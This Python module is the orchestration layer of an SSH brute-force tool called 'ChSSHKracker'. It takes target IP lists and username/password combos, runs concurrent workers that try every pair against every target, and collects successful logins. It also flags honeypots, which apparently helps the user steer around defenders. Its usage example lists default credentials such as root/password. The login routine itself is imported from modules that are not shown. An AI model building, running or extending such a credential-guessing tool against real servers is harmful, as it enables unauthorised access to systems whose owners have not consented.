#!/usr/bin/python3
# -*- UTF-8 -*-

##############################################################
# ChSSHKracker     : Advanced SSH Brute Force Tool           #
# Original Author  : Ch4120N                                 #
# Version          : 1.0.0                                   #
# License          : Apache 2.0                              #
##############################################################

import os
import signal
import logging
from dataclasses import dataclass, field
from typing import List, Tuple, Optional, Callable

from core.worker import Worker
from core.config import Config, FILE_PATH, Globals
from core.stats import Stats, _stats_lock
from core.models import ServerInfo
from utils.file_manager import FileManager

logger = logging.getLogger(__name__)


@dataclass
class AttackConfig:
    """Configuration for SSH brute force attack."""
    ip_file: Optional[str] = None
    username_file: Optional[str] = None
    password_file: Optional[str] = None
    combo_file: Optional[str] = None
    timeout: int = 5
    max_workers: int = 25
    per_worker: int = 25

    # Direct credential lists (alternative to files)
    targets: List[Tuple[str, str]] = field(default_factory=list)
    combos: List[Tuple[str, str]] = field(default_factory=list)


@dataclass
class AttackResult:
    """Result of an SSH brute force attack."""
    total_tasks: int = 0
    goods: int = 0
    errors: int = 0
    honeypots: int = 0
    success_list: List[ServerInfo] = field(default_factory=list)
    honeypot_list: List[ServerInfo] = field(default_factory=list)


class ChSSHKracker:
    """
    Programmatic interface for SSH brute force attacks.

    Usage:
        kracker = ChSSHKracker()

        # Configure via files
        config = AttackConfig(
            ip_file='targets.txt',
            combo_file='credentials.txt',
            timeout=5,
            max_workers=25
        )

        # Or configure directly
        config = AttackConfig(
            targets=[('192.168.1.1', '22'), ('192.168.1.2', '22')],
            combos=[('root', 'password'), ('admin', 'admin123')]
        )

        # Run with optional callbacks
        result = kracker.run(
            config,
            on_success=lambda s: print(f"Found: {s.ip}"),
            on_progress=lambda g, e, h, t: print(f"Progress: {g+e+h}/{t}")
        )
    """

    def __init__(self) -> None:
        self._setup_signal_handler()
        self._result = AttackResult()

    def _setup_signal_handler(self) -> None:
        """Setup SIGINT handler for graceful shutdown."""
        signal.signal(signal.SIGINT, self._handle_sigint)

    def _handle_sigint(self, signum, frame) -> None:
        """Handle interrupt signal."""
        logger.info("Interrupt received, stopping...")
        Globals._stop_event.set()

    def run(
        self,
        config: AttackConfig,
        on_success: Optional[Callable[[ServerInfo], None]] = None,
        on_honeypot: Optional[Callable[[ServerInfo], None]] = None,
        on_progress: Optional[Callable[[int, int, int, int], None]] = None
    ) -> AttackResult:
        """
        Run SSH brute force attack.

        Args:
            config: Attack configuration
            on_success: Callback when valid credentials found
            on_honeypot: Callback when honeypot detected
            on_progress: Callback for progress (goods, errors, honeypots, total)

        Returns:
            AttackResult with attack statistics and findings
        """
        self._result = AttackResult()

        # Reset global state
        Globals._stop_event.clear()
        Stats.Goods = Stats.Goods.__class__()
        Stats.Errors = Stats.Errors.__class__()
        Stats.Honeypots = Stats.Honeypots.__class__()

        # Load or use provided credentials
        combos = self._load_combos(config)
        targets = self._load_targets(config)

        if not combos:
            logger.error("No credentials loaded")
            return self._result

        if not targets:
            logger.error("No targets loaded")
            return self._result

        total_tasks = len(combos) * len(targets)
        self._result.total_tasks = total_tasks

        logger.info(f"Starting attack: {len(targets)} targets x {len(combos)} combos = {total_tasks} tasks")

        # Wrap callbacks to collect results
        def success_wrapper(server: ServerInfo) -> None:
            self._result.success_list.append(server)
            if on_success:
                on_success(server)

        def honeypot_wrapper(server: ServerInfo) -> None:
            self._result.honeypot_list.append(server)
            if on_honeypot:
                on_honeypot(server)

        worker = Worker(
            combos=combos,
            targets=targets,
            total_tasks=total_tasks,
            timeout=config.timeout,
            max_workers=config.max_workers,
            per_worker=config.per_worker,
            on_success=success_wrapper,
            on_honeypot=honeypot_wrapper,
            on_progress=on_progress
        )
        worker.run()

        # Collect final stats
        with _stats_lock:
            self._result.goods = Stats.Goods.get()
            self._result.errors = Stats.Errors.get()
            self._result.honeypots = Stats.Honeypots.get()

        logger.info(
            f"Attack completed: {self._result.goods} success, "
            f"{self._result.honeypots} honeypots, {self._result.errors} errors"
        )

        return self._result

    def stop(self) -> None:
        """Stop the running attack."""
        Globals._stop_event.set()

    def _load_combos(self, config: AttackConfig) -> List[Tuple[str, str]]:
        """Load username:password combinations."""
        if config.combos:
            return config.combos

        if config.combo_file:
            if not self._validate_file(config.combo_file):
                return []
            return FileManager.parse_combo(config.combo_file)

        if config.username_file and config.password_file:
            if not self._validate_file(config.username_file):
                return []
            if not self._validate_file(config.password_file):
                return []

            # Generate combo file
            combo_path = FILE_PATH.COMBO_FILE
            FileManager.create_combo_file(
                config.username_file,
                config.password_file,
                combo_path
            )
            return FileManager.parse_combo(combo_path)

        return []

    def _load_targets(self, config: AttackConfig) -> List[Tuple[str, str]]:
        """Load target IP:port combinations."""
        if config.targets:
            return config.targets

        if config.ip_file:
            if not self._validate_file(config.ip_file):
                return []
            return FileManager.parse_targets(config.ip_file)

        return []

    def _validate_file(self, path: str) -> bool:
        """Validate that a file exists and is readable."""
        if not os.path.isfile(path):
            logger.error(f"File not found: {path}")
            return False
        return True


# Expose key classes for external use
__all__ = [
    'ChSSHKracker',
    'AttackConfig',
    'AttackResult',
    'ServerInfo',
    'Config',
    'Globals',
    'Stats'
]
